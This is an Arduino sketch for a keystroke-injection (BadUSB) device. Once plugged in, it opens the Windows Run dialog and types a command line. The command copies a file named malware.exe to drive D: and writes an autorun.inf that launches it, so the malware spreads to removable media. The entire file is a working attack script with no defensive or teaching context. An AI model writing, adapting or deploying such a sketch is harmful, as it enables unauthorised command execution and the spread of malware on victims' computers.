#include <USBHIDKeyboard.h>
USBHIDKeyboard Keyboard;

void setup() {
  Keyboard.begin();
  delay(3000);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(500);
  Keyboard.println("cmd /c copy C:\\malware.exe D: & echo [autorun] > D:\\autorun.inf & echo open=malware.exe >> D:\\autorun.inf");
}

void loop() {}
